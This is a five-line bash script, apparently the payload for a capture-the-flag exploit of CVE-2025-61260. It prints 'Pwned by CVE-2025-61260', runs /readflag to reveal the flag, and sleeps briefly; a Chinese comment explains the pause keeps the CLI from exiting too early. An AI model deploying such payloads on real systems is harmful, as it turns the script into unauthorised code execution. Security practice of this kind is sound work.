#!/bin/bash
echo "Pwned by CVE-2025-61260" >&2
/readflag >&2
# 保持运行一小会儿防止 CLI 报错退出太快
sleep 2